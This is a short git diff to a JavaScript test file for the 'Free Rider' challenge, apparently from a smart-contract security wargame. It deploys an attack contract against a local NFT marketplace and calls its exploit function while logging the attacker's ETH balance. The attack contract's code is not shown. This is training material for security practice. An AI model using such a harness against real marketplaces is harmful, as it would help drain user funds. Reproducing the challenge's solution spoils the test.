@@ -101,10 +101,18 @@ describe('[Challenge] Free Rider', function () {
             this.nft.address, 
             { value: BUYER_PAYOUT }
         );
+
+        // todo : add constructor params
+        this.attackMarketplaceContract = await (await ethers.getContractFactory('AttackNFTMarketplace', deployer))
+        .deploy(this.uniswapPair.address, this.weth.address, this.marketplace.address, this.nft.address, this.buyerContract.address);
+
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        console.log("Attacker Initial ETH balance : ", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
+        await this.attackMarketplaceContract.connect(attacker).exploit();
+        console.log("Attacker final ETH balance : ", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
     });
 
     after(async function () {
